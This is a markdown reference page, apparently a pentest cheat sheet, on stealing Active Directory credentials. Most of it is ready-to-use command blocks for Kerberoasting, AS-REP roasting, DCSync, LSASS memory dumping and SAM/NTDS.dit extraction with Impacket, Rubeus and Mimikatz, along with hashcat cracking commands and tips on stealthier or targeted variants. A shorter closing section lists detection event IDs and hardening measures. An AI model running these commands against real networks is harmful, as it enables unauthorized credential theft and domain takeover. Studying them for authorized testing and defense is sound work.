---
title: Active Directory Credential Attacks
category: techniques
subcategory: active-directory
tags: [credentials, kerberoasting, asrep-roasting, dcsync, lsass, ntds, sam]
last_updated: 2025-12-27
---

# Active Directory Credential Attacks

## Table of Contents

- [Overview](#overview)
- [Kerberoasting](#kerberoasting)
- [AS-REP Roasting](#as-rep-roasting)
- [DCSync Attack](#dcsync-attack)
- [LSASS Dumping](#lsass-dumping)
- [SAM and NTDS Extraction](#sam-and-ntds-extraction)
- [Detection and Defense](#detection-and-defense)
- [References](#references)

## Overview

Credential attacks in Active Directory focus on extracting authentication material (passwords, hashes, tickets) that can be used for lateral movement and privilege escalation.

**Attack Categories:**
- Offline attacks: Kerberoasting, AS-REP Roasting
- Replication attacks: DCSync
- Memory extraction: LSASS dumping
- Database extraction: SAM/NTDS.dit

---

## Kerberoasting

### Description

Kerberoasting requests Kerberos service tickets (TGS) for accounts with Service Principal Names (SPNs). The tickets are encrypted with the service account's password hash, allowing offline cracking.

**Requirements:**
- Valid domain credentials (any domain user)
- Service accounts with SPNs configured

**Why It Works:**
- Any authenticated user can request TGS for any SPN
- TGS is encrypted with service account's NTLM hash
- RC4 encryption (still common) is fast to crack

### Tools

| Tool | Platform | Description |
|------|----------|-------------|
| GetUserSPNs.py | Linux | Impacket script |
| Rubeus | Windows | C# Kerberos toolkit |
| PowerView | Windows | PowerShell enumeration |
| Invoke-Kerberoast | Windows | PowerShell kerberoasting |

### Commands

```bash
# Impacket - GetUserSPNs.py
# Request TGS and output hashes
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request

# Output to file
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# Using NTLM hash
GetUserSPNs.py domain.local/user -hashes :NTLM_HASH -dc-ip DC_IP -request

# Target specific user
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request -target-domain domain.local
```

```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt

# Request RC4 encryption (easier to crack)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Kerberoast with alternate credentials
.\Rubeus.exe kerberoast /creduser:domain\user /credpassword:pass

# PowerView - Find Kerberoastable accounts
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# Invoke-Kerberoast
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | select -ExpandProperty Hash
```

### Cracking Hashes

```bash
# Hashcat - Kerberos 5 TGS-REP (mode 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# With rules
hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule

# John
john --format=krb5tgs --wordlist=wordlist.txt kerberoast.txt
```

### Targeted Kerberoasting

If you have GenericAll/GenericWrite on a user, you can set an SPN to make them Kerberoastable:

```powershell
# Set SPN on user (requires write permissions)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='http/anything'}

# Kerberoast the user
.\Rubeus.exe kerberoast /user:targetuser

# Remove the SPN
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

---

## AS-REP Roasting

### Description

AS-REP Roasting targets accounts that have "Do not require Kerberos preauthentication" enabled. The AS-REP response is encrypted with the user's password hash, allowing offline cracking.

**Requirements:**
- User accounts with `DONT_REQ_PREAUTH` flag set
- No authentication needed to identify targets (can enumerate via LDAP)

### Commands

```bash
# Impacket - GetNPUsers.py
# Check for AS-REP roastable users
GetNPUsers.py domain.local/ -dc-ip DC_IP -usersfile users.txt -no-pass

# With valid credentials (enumerate all vulnerable users)
GetNPUsers.py domain.local/user:password -dc-ip DC_IP -request

# Output format
GetNPUsers.py domain.local/user:password -dc-ip DC_IP -request -format hashcat

# Using NTLM hash
GetNPUsers.py domain.local/user -hashes :NTLM_HASH -dc-ip DC_IP -request
```

```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Target specific user
.\Rubeus.exe asreproast /user:targetuser /format:hashcat

# PowerView - Find AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select samaccountname

# ASREPRoast.ps1
Import-Module .\ASREPRoast.ps1
Invoke-ASREPRoast | select -ExpandProperty Hash
```

### Cracking Hashes

```bash
# Hashcat - Kerberos 5 AS-REP (mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt

# With rules
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule

# John
john --format=krb5asrep --wordlist=wordlist.txt asrep.txt
```

### Targeted AS-REP Roasting

If you have GenericAll/GenericWrite on a user, you can disable preauth:

```powershell
# Disable preauthentication (requires write permissions)
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}

# AS-REP roast the user
.\Rubeus.exe asreproast /user:targetuser

# Re-enable preauthentication
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
```

---

## DCSync Attack

### Description

DCSync uses the Directory Replication Service (MS-DRSR) to request credential data from a Domain Controller. It replicates password hashes as if the attacker were another DC.

**Requirements:**
- Account with replication rights:
  - Domain Admins, Enterprise Admins
  - Accounts with `Replicating Directory Changes` and `Replicating Directory Changes All`

### Commands

```bash
# Impacket - secretsdump.py
# Full DCSync (all hashes)
secretsdump.py domain.local/admin:password@DC_IP

# Using NTLM hash
secretsdump.py -hashes :NTLM_HASH domain.local/admin@DC_IP

# Target specific user (stealthier)
secretsdump.py -just-dc-user krbtgt domain.local/admin:password@DC_IP
secretsdump.py -just-dc-user Administrator domain.local/admin:password@DC_IP

# Just NTLM hashes (no cleartext)
secretsdump.py -just-dc-ntlm domain.local/admin:password@DC_IP
```

```
# Mimikatz
privilege::debug

# DCSync specific user
lsadump::dcsync /user:domain\krbtgt
lsadump::dcsync /user:domain\Administrator

# DCSync all users
lsadump::dcsync /all /csv

# Specify DC
lsadump::dcsync /user:krbtgt /domain:domain.local /dc:dc01.domain.local
```

### Check DCSync Rights

```powershell
# PowerView - Find users with DCSync rights
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
  ? {($_.ObjectAceType -match 'Replicating') -and ($_.ActiveDirectoryRights -match 'ExtendedRight')} |
  select SecurityIdentifier, ObjectAceType
```

---

## LSASS Dumping

### Description

The Local Security Authority Subsystem Service (LSASS) stores credentials in memory for logged-on users. Dumping LSASS memory allows extraction of passwords, hashes, and Kerberos tickets.

**Requirements:**
- Local Administrator or SYSTEM privileges
- SeDebugPrivilege (usually implied)

### Methods

**Task Manager (GUI):**
1. Open Task Manager as Administrator
2. Find lsass.exe in Details tab
3. Right-click > Create dump file

**ProcDump (Sysinternals):**
```cmd
# Basic dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# By PID
procdump.exe -accepteula -ma <LSASS_PID> lsass.dmp
```

**comsvcs.dll (Living off the Land):**
```cmd
# Find LSASS PID
tasklist /fi "imagename eq lsass.exe"

# Dump using comsvcs.dll
rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```

**Mimikatz (Direct):**
```
privilege::debug
sekurlsa::logonpasswords    # Extract credentials
sekurlsa::wdigest           # WDigest passwords
sekurlsa::ekeys             # Kerberos keys
sekurlsa::tickets /export   # Export Kerberos tickets
```

**Mimikatz (From Dump):**
```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**pypykatz (Linux):**
```bash
pypykatz lsa minidump lsass.dmp
```

### Credential Extraction Tools

| Tool | Description |
|------|-------------|
| Mimikatz | Standard Windows credential tool |
| pypykatz | Python implementation of Mimikatz |
| nanodump | Stealthy LSASS dumping |
| PPLdump | Bypass PPL protection |
| HandleKatz | Handle duplication technique |

---

## SAM and NTDS Extraction

### Description

The Security Account Manager (SAM) stores local account hashes. The NTDS.dit file on Domain Controllers stores all domain account hashes.

### SAM Extraction

**Registry Method:**
```cmd
# Save registry hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Extract hashes (on Linux)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**Mimikatz:**
```
token::elevate
lsadump::sam
lsadump::secrets   # LSA secrets (service accounts, etc.)
lsadump::cache     # Cached domain credentials
```

### NTDS.dit Extraction

**Volume Shadow Copy:**
```cmd
# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Delete shadow copy
vssadmin delete shadows /shadow={shadow-id}
```

**ntdsutil (Interactive):**
```cmd
ntdsutil
activate instance ntds
ifm
create full C:\temp\ntds_backup
quit
quit
```

**Mimikatz (DCSync preferred):**
```
lsadump::dcsync /all /csv
```

### Extracting Hashes

```bash
# Impacket secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Output format
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile domain_hashes

# With history
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -history
```

---

## Detection and Defense

### Detection

| Attack | Key Indicators |
|--------|---------------|
| Kerberoasting | Event ID 4769 with RC4 encryption, high volume TGS requests |
| AS-REP Roasting | Event ID 4768 without pre-authentication |
| DCSync | Event ID 4662 with replication GUIDs |
| LSASS Dump | Process access to lsass.exe, Event ID 10 (Sysmon) |
| NTDS Extraction | VSS operations, ntdsutil usage |

### Key Event IDs

| Event ID | Description |
|----------|-------------|
| 4768 | TGT request (AS-REP roasting if no preauth) |
| 4769 | TGS request (Kerberoasting) |
| 4662 | Directory object operation (DCSync) |
| 4663 | File access (NTDS.dit access) |
| 4688 | Process creation (tool execution) |

### DCSync Detection (Event ID 4662)

Monitor for these GUIDs:
- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` - Replicating Directory Changes
- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` - Replicating Directory Changes All
- `89e95b76-444d-4c62-991a-0facbeda640c` - Replicating Directory Changes In Filtered Set

### Defensive Measures

**Kerberoasting/AS-REP:**
- Use long, random passwords for service accounts (25+ characters)
- Use Group Managed Service Accounts (gMSA)
- Enable AES encryption only (disable RC4)
- Audit and minimize accounts with SPNs
- Disable "Do not require preauth" where not needed

**DCSync:**
- Audit accounts with replication rights
- Monitor Event ID 4662 for non-DC sources
- Use tiered administration model
- Implement Protected Users group

**LSASS Protection:**
- Enable Credential Guard
- Enable LSA Protection (RunAsPPL)
- Disable WDigest authentication
- Use Remote Credential Guard for RDP

**NTDS.dit Protection:**
- Monitor VSS operations on DCs
- Alert on ntdsutil usage
- Restrict physical/virtual access to DCs
- Enable BitLocker on DC drives

```powershell
# Disable WDigest (prevents cleartext passwords in memory)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0

# Enable LSA Protection
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1
```

---

## References

- [MITRE ATT&CK - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK - AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
- [MITRE ATT&CK - DCSync](https://attack.mitre.org/techniques/T1003/006/)
- [MITRE ATT&CK - LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [The Hacker Recipes - Credential Dumping](https://www.thehacker.recipes/ad/movement/credentials/dumping/)
- [adsecurity.org - DCSync](https://adsecurity.org/?p=2398)
- [Red Canary - OS Credential Dumping](https://redcanary.com/threat-detection-report/techniques/os-credential-dumping/)
